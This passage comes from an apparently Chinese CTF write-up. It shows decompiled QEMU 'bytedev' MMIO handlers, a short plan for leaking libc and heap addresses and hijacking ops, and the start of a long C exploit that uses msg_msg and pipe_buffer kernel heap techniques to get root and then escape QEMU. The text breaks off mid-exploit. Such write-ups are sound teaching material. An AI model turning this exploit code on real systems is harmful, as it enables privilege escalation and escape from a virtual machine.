class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">byte_dev_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">87</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.blk_status != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据mmio这俩函数就可以实现任意地址读写。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里利用方法其实挺简单的，就直接在<code>BYTEPCIDevState</code>结构体上找可以利用的地址计算差值即可。思路就是首先泄漏libc地址再泄漏heap地址即可。最后泄漏ops中的内容，并且伪造ops。在最后劫持ops实现栈迁移到堆地址即可完成利用。</p><h2 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    qemu_escape();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_escape</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span> *fake_ops = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak process base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x114514</span>, <span class="number">1</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-25</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span 